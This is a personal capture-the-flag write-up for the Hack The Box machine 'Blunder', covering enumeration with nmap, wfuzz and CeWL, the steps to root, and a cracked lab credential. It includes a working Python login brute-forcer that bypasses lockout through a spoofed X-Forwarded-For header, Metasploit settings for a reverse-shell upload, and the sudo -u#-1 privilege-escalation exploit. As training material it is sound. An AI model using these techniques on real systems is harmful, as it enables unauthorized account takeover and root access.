<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Blunder writeup</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><h1><b><u>Blunder writeup</u></b></h1>Step 1: Scanning &amp; Enum<br />While scanning the Blunder machine on 10.10.10.191 with nmap, I went quickly to google to check whether or not port 80 is open.<br />It is and I get the following screen:<br /><img src="images/4-1.png" alt="images/4-1.png" /><br /><br />I see that this is some kind of a blog page. This means there's probably an admin panel that lets administrators/privilieged users to post on the site. As the example above, a post on stephen king.<br /><br />I run nmap again but this time only: nmap 10.10.10.191 --script vuln<br /><br /><br />nmap goes and gives back the following results, including some interesting enum results: <br /><img src="images/4-2.png" alt="images/4-2.png" /><br /><br /><br />hmnmm..."/admin/"? let's go there!<br /><br /><img src="images/4-3.png" alt="images/4-3.png" /><br /><br /><br />So in this stage I got a bit stuck since I lack knowledge on http enumeration.<br />I went to this writeup for some inspiration: <a href="https://ca0y1h.top/Target_drone/HackTheBox/19.HTB-Blunder-walkthrough/">https://ca0y1h.top/Target_drone/HackTheBox/19.HTB-Blunder-walkthrough/</a><br />In here, he uses a new tool which I was not familiar with before: wfuzz<br /><br /><img src="images/4-4.png" alt="images/4-4.png" /><br /><br />After fuzzing a bit with wfuzz, I get 2 results: robots.txt and todo.txt<br /><br /><img src="images/4-5.png" alt="images/4-5.png" /><br />(this screenshot was taken from the writeup)<br /><br />-c - output with colors<br />--hc - filters out all the pages with response code of 404 and 403.<br />-u - url (note that “http://blunder.htb/FUZZ.txt” is false and I replaced it with “http://10.10.10.191/FUZZ.txt”)<br />-t - specify the number of connections the server can handle at a time. here it says 100 and it's ok. note that the server will block you if you attempt to login too much.<br /><br /><br />todo.txt seems irregular.<br /><br /><img src="images/4-6.png" alt="images/4-6.png" /><br /><br />“Inform fergus that the new blog needs images - PENDING”<br />fergus???<br />well, I guess that's a username. Worth a try at least.<br /><br />Next step is to brute-force that username. <br />So I wanted to use JohnTheRipper first, but I thought to myself that it does not really matter. I did not use John because in the writeup, I saw that the dude wrote a perfectly fine and really simple python script that would connect to the target on port 80 and try and bruteforce the username.<br />But beforehand, he used a tool called CeWL!<br /> <br />CeWL is really cool. It spiders a given url and returns suggested passwords to try on crackers like John.<br /><img src="images/4-7.png" alt="images/4-7.png" /><br /><br />from the writeup:<br /><img src="images/4-8.png" alt="images/4-8.png" /><br /><br />note that you should change <a href="http://blunder.htb/">http://blunder.htb/</a> to http://10.10.10.191/<br /><br /><br /><div class="codebox"><div class="codebox"><span style="color:#0088ff;font-weight:400">#!/usr/bin/env&nbsp;python3</span><br /><span style="color:#333333;font-weight:400">import</span>&nbsp;re<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;requests<br /><span style="color:#0088ff;font-weight:400">#from&nbsp;__future__&nbsp;import&nbsp;print_function</span><br /><br />def&nbsp;open_ressources(file_path):<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;[item.replace(<span style="color:#3ad900;font-weight:400">"\n"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">""</span>)&nbsp;for&nbsp;item&nbsp;in&nbsp;open(file_path).readlines()]<br /><br />host&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'http://10.10.10.191'</span><br />login_url&nbsp;=&nbsp;host&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">'/admin/login'</span><br />username&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'fergus'</span><br />wordlist&nbsp;=&nbsp;open_ressources(<span style="color:#3ad900;font-weight:400">'/home/Hackthebox/Blunder/wordlist.txt'</span>)<br /><br />for&nbsp;password&nbsp;in&nbsp;wordlist:<br />&nbsp;&nbsp;&nbsp;&nbsp;session&nbsp;=&nbsp;requests.Session()<br />&nbsp;&nbsp;&nbsp;&nbsp;login_page&nbsp;=&nbsp;session.get(login_url)<br />&nbsp;&nbsp;&nbsp;&nbsp;csrf_token&nbsp;=&nbsp;re.search(<span style="color:#3ad900;font-weight:400">'input.+?name="tokenCSRF".+?value="(.+?)"'</span>,&nbsp;login_page.text).group(<span style="color:#ff0044;font-weight:400">1</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'[*]&nbsp;Trying:&nbsp;{p}'</span>.format(p&nbsp;=&nbsp;password))<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;headers&nbsp;=&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'X-Forwarded-For'</span>:&nbsp;password,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'User-Agent'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">'Mozilla/5.0&nbsp;(X11;&nbsp;Linux&nbsp;x86_64)&nbsp;AppleWebKit/537.36&nbsp;(KHTML,&nbsp;like&nbsp;Gecko)&nbsp;Chrome/77.0.3865.90&nbsp;Safari/537.36'</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'Referer'</span>:&nbsp;login_url<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'tokenCSRF'</span>:&nbsp;csrf_token,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'username'</span>:&nbsp;username,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'password'</span>:&nbsp;password,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'save'</span>:&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;login_result&nbsp;=&nbsp;session.post(login_url,&nbsp;headers&nbsp;=&nbsp;headers,&nbsp;data&nbsp;=&nbsp;data,&nbsp;allow_redirects&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">False</span>)<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;<span style="color:#3ad900;font-weight:400">'location'</span>&nbsp;in&nbsp;login_result.headers:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;<span style="color:#3ad900;font-weight:400">'/admin/dashboard'</span>&nbsp;in&nbsp;login_result.headers[<span style="color:#3ad900;font-weight:400">'location'</span>]:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'SUCCESS:&nbsp;Password&nbsp;found!'</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">'Use&nbsp;{u}:{p}&nbsp;to&nbsp;login.'</span>.format(u&nbsp;=&nbsp;username,&nbsp;p&nbsp;=&nbsp;password))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">print</span>()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</div></div><br /><br />After a small while, I get a hit<br /><img src="images/4-9.png" alt="images/4-9.png" /><br /><br />Amazing! Now I can log into the admin panel.<br /><br /><img src="images/4-10.png" alt="images/4-10.png" /><br /><br />Great! I snoop around a bit and find that this panel has the possibility of uploading files, but only in an img format.<br /><br />I look up quickly a way to have a php reverse shell through a .img extension and find that there is a metasploit module.<br />I fire msfconsole and use it:<br /><br /><img src="images/4-11.png" alt="images/4-11.png" /><br /><br />set BLUDITPASS &lt;password&gt;<br />set BLUDITUSER &lt;user&gt;<br />set RHOSTS &lt;rhost&gt;<br />run<br /><br /><img src="images/4-12.png" alt="images/4-12.png" /><br /><br /><img src="images/4-13.png" alt="images/4-13.png" /><br /><br />we got our basic www shell. <br />Next step: priv esc!<br /><br />I snoop around a bit with the www user and find the user flag, but unfortunately, access is denied since this file is in “hugo”s home.<br /><img src="images/4-14.png" alt="images/4-14.png" /><br /><br />I guess I have to keep on searching.<br /><br />Well, I searched a lot and finally gave up and addressed the write-up.<br />This is a note to self because I gave up too fast.<br />Firstly, I went to /var/www/bludit-3.9.2 and snoop around there.<br />I find out there's a user.php file in bludit-3.9.2/databases<br /><img src="images/4-15.png" alt="images/4-15.png" /><br /><br />This is not quite useful since this presents the password to the admin panel that we already have access to.<br /><br />This is the part where I gave up and went to the writeup.<br />So the writeup itself was not so different. <br />instead of going to /var/www/bludit-3.9.2, he went to /var/www/bludit-3.10.0a/databases/user.php<br />This is a different version of bludit and is worth checking. Something critical my eye missed!<br /><img src="images/4-16.png" alt="images/4-16.png" /><br /><br />There we go, Hugo!<br />the password seems hashed. <br />I found this AMAZING tool which finds automatically the algorithm used to hash the string, and returns the result without me tampering with all of Google trying to decrypt this strange hash!<br />The tool is: <a href="https://md5hashing.net/">https://md5hashing.net/</a><br />There you have the option to search by all hashes and that's it!<br /><br />The decrypted hash results to: Password120<br />hugo:Password120<br /><br /><img src="images/4-17.png" alt="images/4-17.png" /><br /><br />basic user shell granted! I went ahead and grabbed the user flag.<br /><br />What's next? how to priv esc?<br />This is really one of my weakest spots in pentesting, so I went and glanced over the writeup.<br /><br />In the writeup, the amazing dude does the following:<br /><img src="images/4-18.png" alt="images/4-18.png" /><br /><br />-l - tells you what commands can your logged in user run<br />basically, user hugo can run all commands except root commands (!root - "NOT"root)<br />so what do I do?<br /><br />I google (ALL, !root) /bin/bash and found and amazing explanation from the CVE itself (<a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a>):<br /><code>'''Check for the user sudo permissions<br /><br />sudo -l <br /><br />User hacker may run the following commands on kali:<br />    (ALL, !root) /bin/bash<br /><br /><br />So user hacker can't run /bin/bash as root (!root)<br /><br /><br />User hacker sudo privilege in /etc/sudoers<br /><br /># User privilege specification<br />root    ALL=(ALL:ALL) ALL<br /><br />hacker ALL=(ALL,!root) /bin/bash<br /><br /><br />With ALL specified, user hacker can run the binary /bin/bash as any user<br /><br />EXPLOIT: <br /><br />sudo -u#-1 /bin/bash<br /><br />Example : <br /><br />hacker@kali:~$ sudo -u#-1 /bin/bash<br />root@kali:/home/hacker# id<br />uid=0(root) gid=1000(hacker) groups=1000(hacker)<br />root@kali:/home/hacker#<br /><br />Description :<br />Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv<br />-u#-1 returns as 0 which is root's id</code><br /><br />Amazing explanation.<br /><br /><img src="images/4-19.png" alt="images/4-19.png" /><br /><br />#rooted. <br />I went ahead to /root/root.txt and got the root flag.</body></html>